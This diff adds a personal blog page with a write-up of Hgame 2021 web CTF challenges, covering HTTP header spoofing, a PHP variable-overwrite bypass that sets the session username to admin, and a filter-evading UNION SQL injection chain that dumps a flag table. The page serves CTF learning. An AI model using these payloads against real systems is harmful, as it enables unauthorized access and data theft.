@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="曾经山海难为水">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hgame2021 web">
+<meta property="og:url" content="http://example.com/2021/03/06/Hgame-2021-web/index.html">
+<meta property="og:site_name" content="Havisham&#39;s Blog">
+<meta property="og:description" content="曾经山海难为水">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2021/03/06/images/sfc1.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/sfc2.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/sfc3.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/sfc4.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/sfc5.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/sfc6.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/sqli1.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/sqli2.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/tjjz1.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/tjjz2.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/tjjz3.png">
+<meta property="og:image" content="http://example.com/2021/03/06/images/tjjz4.png">
+<meta property="article:published_time" content="2021-03-06T06:35:48.000Z">
+<meta property="article:modified_time" content="2021-03-28T08:31:51.160Z">
+<meta property="article:author" content="Havisham">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2021/03/06/images/sfc1.png">
+
+<link rel="canonical" href="http://example.com/2021/03/06/Hgame-2021-web/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Hgame2021 web | Havisham's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Havisham's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">应似飞鸿踏雪泥</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/06/Hgame-2021-web/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Havisham">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Havisham's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hgame2021 web
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-03-06 14:35:48" itemprop="dateCreated datePublished" datetime="2021-03-06T14:35:48+08:00">2021-03-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-28 16:31:51" itemprop="dateModified" datetime="2021-03-28T16:31:51+08:00">2021-03-28</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>曾经山海难为水</p>
+<span id="more"></span>
+
+<p>除却巫山不是云</p>
+<h2 id="Week1"><a href="#Week1" class="headerlink" title="Week1"></a>Week1</h2><h3 id="Hitchhiking-in-the-Galaxy"><a href="#Hitchhiking-in-the-Galaxy" class="headerlink" title="Hitchhiking_in_the_Galaxy"></a>Hitchhiking_in_the_Galaxy</h3><ul>
+<li>HTTP协议，常⻅状态码、请求头</li>
+</ul>
+<p>点击“我要搭顺⻛⻋”跳转到<code>HitchhikerGuide.php</code>，但是⼜⻢上<code>302</code>跳回来了。</p>
+<p><img src="../images/sfc1.png"></p>
+<blockquote>
+<p>302 Found，可以简单的理解为该资源原本确实存在，但已经被临时改变了位置。</p>
+</blockquote>
+<p>抓包访问<code>/HitchhikerGuide.php</code>，发现<code>405 Method Not Allowed</code>，说明请求的⽅法错了。<br><img src="../images/sfc2.png"></p>
+<blockquote>
+<p>405    Method Not Allowed，客户端请求中的方法被禁止</p>
+</blockquote>
+<p>常⻅的请求⽅法都试试，<code>GET / POST / PUT / HEAD</code>，发现改为<code>POST</code>请求后成功了。<br><img src="../images/sfc3.png"><br>需要⽤⽆限⾮概率引擎访问，改<code> User-Agent</code> 为 <code>Infinite Improbability Drive </code>。</p>
+<blockquote>
+<p>User Agent中文名为用户代理，简称 UA，它是一个特殊字符串头，使得服务器能够识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等。</p>
+</blockquote>
+<p><img src="../images/sfc4.png"><br>必须从Cardinal(在源码能找到它的链接)来，需要更改 <code>Referer</code> 请求头。</p>
+<blockquote>
+<p>Referer，告诉服务器该网页是从哪个页面链接过来的</p>
+</blockquote>
+<p><img src="../images/sfc5.png"><br>需要从本地访问，考察的是 <code>X-Forwarded-For</code> 请求头，改为 <code>localhost</code> 或 <code>127.0.0.1</code> 。</p>
+<blockquote>
+<p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。</p>
+</blockquote>
+<p><img src="../images/sfc6.png"></p>
+<h2 id="Week2"><a href="#Week2" class="headerlink" title="Week2"></a>Week2</h2><h3 id="LazyDogR4U"><a href="#LazyDogR4U" class="headerlink" title="LazyDogR4U"></a>LazyDogR4U</h3><ul>
+<li>简单的php审计、<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12587249.html">变量覆盖</a></li>
+</ul>
+<p>扫目录发现<a target="_blank" rel="noopener" href="http://www.zip,拿到源码./">www.zip，拿到源码。</a><br>在 <code>flag.php</code> 中找到获得flag的⽅法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;admin将于今日获取自己忠实的flag&lt;/h3&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h3 style=&#x27;color: white&#x27;&gt;<span class="subst">$flag</span>&lt;/h3&gt;&quot;</span>;</span><br></pre></td></tr></table></figure>
+<p>在 <code>lazy.php</code> 中会将 <code>_GET</code> 、<code> _POST</code> 传⼊的变量全部注册为普通变量，造成了变量覆盖，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xhds/p/12586928.html">动态变量覆盖</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$filter</span> = [<span class="string">&quot;SESSION&quot;</span>, <span class="string">&quot;SEVER&quot;</span>, <span class="string">&quot;COOKIE&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 直接注册所有变量，这样我就能少打字力，芜湖~</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;_GET&#x27;</span>,<span class="string">&#x27;_POST&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_k</span> =&gt; <span class="variable">$_v</span>)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filter</span> <span class="keyword">as</span> <span class="variable">$youBadBad</span>)&#123;</span><br><span class="line">            <span class="variable">$_k</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$youBadBad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_k</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;<span class="variable">$_k</span>&#125; = <span class="variable">$_v</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>把<code>_GET</code>和<code>_POST</code>代入为<code>$_request</code>，再到第二个循环里拼接一个<code>$</code>就变成了<code>$_GET</code>和<code>$_POST</code>，<code>$_k</code>就是传入的参数名，<code>$_v</code>就是该参数的值。<br>（后面不太懂，引用一下别人的wp</p>
+<blockquote>
+<p>存在变量覆盖，有2种姿势，正常的姿势肯定就是双写绕过，把session覆盖了即可。第二种姿势就是foreach分别对get和post进行，get可以把<code>$filter</code>给覆盖掉，然后post就可以随意覆盖session了，两种方式都可以。<br>payload1:<code>?_SESSESSIONSION[username]=admin</code> (传⼊数组的时候有个小小的坑，键名不可以加引号<br>payload2:<code>?filter=0</code> (出现一个报错页面，然后<br><code>?_SESSION[username]=admin</code> 得到flag。</p>
+</blockquote>
+<h3 id="200OK"><a href="#200OK" class="headerlink" title="200OK!!"></a>200OK!!</h3><ul>
+<li>基础SQL注⼊</li>
+<li>hint: status 字段会有什么坏心思呢?</li>
+<li>hint: 这些字符串存在哪里呢？变量？还是…？</li>
+</ul>
+<p>reload多几次在 <code>Network</code> 发现 <code>/server.php</code> Header 中的 <code>status</code>，结合hint <code>status</code> 是一个注入点。</p>
+<p><img src="../images/sqli1.png"></p>
+<blockquote>
+<p>过滤的字符串是 [‘select’, ‘SELECT’, ‘from’, ‘FROM’, ‘union’, ‘UNION’, ‘where’,’WHERE’, ‘ ‘]</p>
+</blockquote>
+<p>⽤ /**/ 替代空格，然后⼤小写混合绕过过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/uniOn/**/seLect/**/database()#</span><br><span class="line"># week2sqli</span><br><span class="line"># 得到数据库为 week2sqli</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/uniOn/**/seLect/**/group_concat(table_name)/**/fRom/**/information_schem</span><br><span class="line">a.tables/**/Where/**/table_schema=&#x27;week2sqli&#x27;#</span><br><span class="line"># f1111111144444444444g,status</span><br><span class="line"># 得到数据库中的所有表名 发现存放 flag 的表名为 f1111111144444444444g</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/uniOn/**/seLect/**/group_concat(column_name)/**/fRom/**/information_sche</span><br><span class="line">ma.columns/**/Where/**/table_name=&#x27;f1111111144444444444g&#x27;/**/and/**/table_schem</span><br><span class="line">a=&#x27;week2sqli&#x27;#</span><br><span class="line"># ffffff14gggggg</span><br><span class="line"># 得到 flag 的字段名为 ffffff14gggggg</span><br><span class="line"></span><br><span class="line">-1&#x27;/**/uniOn/**/seLect/**/ffffff14gggggg/**/fRom/**/f1111111144444444444g#</span><br><span class="line"># 得到 flag: hgame&#123;c0n9ratu1aTion5_yoU_FXXK_Up_tH3_5Q1&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../images/sqli2.png"></p>
+<h3 id="Liki的生日礼物"><a href="#Liki的生日礼物" class="headerlink" title="Liki的生日礼物"></a>Liki的生日礼物</h3><ul>
+<li>条件竞争</li>
+</ul>
+<p>不是很懂，只学会了用bp试着跑一下<br><img src="../images/tjjz1.png"><br><img src="../images/tjjz2.png"><br><img src="../images/tjjz3.png"><br><img src="../images/tjjz4.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/vidar-team/Hgame2021_writeup">官方wp</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51078229/article/details/113815803?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">[杭电Hgame]2021web week2（变量覆盖+多线程条件竞争+sql注入）</a></li>
+<li><a target="_blank" rel="noopener" href="https://miaotony.xyz/2021/02/23/CTF_2021HgameWeek3/#toc-heading-5">CTF | 2021 Hgame Week3 WriteUp</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/30/SQL%E6%B3%A8%E5%85%A5-1/" rel="prev" title="SQL注入-1">
+      <i class="fa fa-chevron-left"></i> SQL注入-1
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/03/14/BUUCTF%E5%81%9A%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="next" title="BUUCTF做题笔记">
+      BUUCTF做题笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Week1"><span class="nav-number">1.</span> <span class="nav-text">Week1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Hitchhiking-in-the-Galaxy"><span class="nav-number">1.1.</span> <span class="nav-text">Hitchhiking_in_the_Galaxy</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Week2"><span class="nav-number">2.</span> <span class="nav-text">Week2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LazyDogR4U"><span class="nav-number">2.1.</span> <span class="nav-text">LazyDogR4U</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#200OK"><span class="nav-number">2.2.</span> <span class="nav-text">200OK!!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Liki%E7%9A%84%E7%94%9F%E6%97%A5%E7%A4%BC%E7%89%A9"><span class="nav-number">2.3.</span> <span class="nav-text">Liki的生日礼物</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">3.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Havisham"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Havisham</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-candy-cane"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Havisham</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
